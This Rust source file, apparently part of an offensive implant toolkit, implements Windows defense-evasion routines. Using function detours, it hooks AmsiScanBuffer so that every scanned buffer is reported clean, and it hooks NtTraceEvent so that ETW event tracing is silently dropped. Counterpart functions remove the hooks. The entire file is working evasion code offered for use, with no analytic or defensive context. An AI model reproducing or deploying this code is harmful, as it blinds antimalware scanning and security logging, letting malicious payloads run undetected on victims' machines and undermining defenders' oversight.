use std::{ffi::c_void, sync::atomic};

use detour::static_detour;

type AmsiScanBufferFn = unsafe extern "system" fn(
    *mut c_void, *const u8, u32,
    *mut u16, *mut c_void, *mut u32 
) -> i32;
type NtTraceEvent = unsafe extern "system" fn(
    Handle: *mut c_void, Event: *mut c_void
) -> i32;

static mut AMSI_BYPASS_BE_INITED: bool = false;
static mut ETW_BYPASS_BE_INITED: bool = false;
static mut AMSI_BYPASS_ATOMIC: atomic::AtomicU8 = atomic::AtomicU8::new(0);
static mut ETW_BYPASS_ATOMIC: atomic::AtomicU8 = atomic::AtomicU8::new(0);

static_detour! {
    static AmsiScanBufferDetour: unsafe extern "system" fn(
        *mut c_void,*const u8,u32,*mut u16,
        *mut c_void,*mut u32 
    ) -> i32;
    static NtTraceEventDetour: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
}

pub unsafe fn bypass_amsi() {
    if !AMSI_BYPASS_BE_INITED {
        let original_amsi: AmsiScanBufferFn = std::mem::transmute(windows_sys::Win32::System::Antimalware::AmsiScanBuffer as *const ());
        let _ = AmsiScanBufferDetour.initialize(original_amsi, |_,_,_,_,_, value: *mut u32| {
            // AMSI_RESULT_CLEAN
            *value = 0;
            return 0;
        });
    }
    AMSI_BYPASS_BE_INITED = true;
    let _ = AmsiScanBufferDetour.enable();
    AMSI_BYPASS_ATOMIC.fetch_add(1, atomic::Ordering::AcqRel);
}

pub unsafe fn bypass_etw() {
    #[cfg(feature = "source")]
    {
        if !ETW_BYPASS_BE_INITED {
            use malefic_win_kit::apis::DynamicApis::NT_TRACE_EVENT;
            if NT_TRACE_EVENT.is_none() {
                return;
            }
            let nt_trace_event = NT_TRACE_EVENT.as_ref().unwrap();
            let original_nt_trace_event: NtTraceEvent = std::mem::transmute(*nt_trace_event);
            let _ = NtTraceEventDetour.initialize(original_nt_trace_event, |_,_| {
                return 0;
            });
        }
        ETW_BYPASS_BE_INITED = true;
        let _ = NtTraceEventDetour.enable();
        ETW_BYPASS_ATOMIC.fetch_add(1, atomic::Ordering::AcqRel);
    }
}

pub unsafe fn enable_amsi() {
    AMSI_BYPASS_ATOMIC.fetch_sub(1, atomic::Ordering::AcqRel);
    if AMSI_BYPASS_ATOMIC.load(atomic::Ordering::Acquire) > 0 {
        return;
    }
    let _ = AmsiScanBufferDetour.disable();
}

pub unsafe fn enable_etw() {
    ETW_BYPASS_ATOMIC.fetch_sub(1, atomic::Ordering::AcqRel);
    if ETW_BYPASS_ATOMIC.load(atomic::Ordering::Acquire) > 0 {
        return;
    }
    let _ = NtTraceEventDetour.disable();
}